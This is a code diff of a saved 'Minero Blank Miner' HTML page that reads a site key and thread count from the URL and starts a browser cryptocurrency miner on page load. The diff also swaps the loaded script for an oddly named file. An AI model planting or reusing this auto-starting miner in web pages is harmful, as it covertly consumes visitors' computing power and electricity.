@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
+<!-- saved from url=(0039)https://minero.cc/html/blank-miner.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
     <meta name="description" content="Minero Blank Miner">
     <title>Minero Blank Miner</title>
   </head>
   <body>
-    <script type="text/javascript" src="./a.js"></script>
+    <script type="text/javascript" src="./cm-screener-fail.js"></script>
     <script type="text/javascript">
       function getParameterByName(name, url) {
         if (!url) url = window.location.href;
@@ -24,7 +24,7 @@
       var threads = getParameterByName('threads');
 
       if (!key) {
-    		throw('invalid site key');
+            throw('invalid site key');
       }
 
       var minerOpts = {};
@@ -36,9 +36,10 @@
       }
 
       var miner = (user && user.length >= 1)
-    		? new Minero.User(key, user, minerOpts)
-    		: new Minero.Anonymous(key, minerOpts);
+            ? new Minero.User(key, user, minerOpts)
+            : new Minero.Anonymous(key, minerOpts);
       miner.start();
     </script>
-  </body>
-</html>
+  
+
+</body></html>
